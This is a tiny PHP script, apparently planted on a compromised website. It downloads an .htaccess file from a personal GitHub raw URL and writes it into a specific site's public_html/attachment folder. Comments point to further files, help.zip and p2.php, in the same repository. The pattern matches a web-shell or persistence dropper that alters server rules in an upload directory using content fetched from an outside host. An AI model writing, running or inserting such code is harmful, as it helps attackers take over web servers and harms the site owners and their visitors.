<?php
//https://github.com/zzqwq555/t1/raw/master/help.zip
//https://raw.githubusercontent.com/zzqwq555/t1/master/p2.php
$code=file_get_contents('https://raw.githubusercontent.com/zzqwq555/t1/master/htaccess.txt');
file_put_contents('/home/home/mco/basiclaw/public_html/attachment/.htaccess',$code);
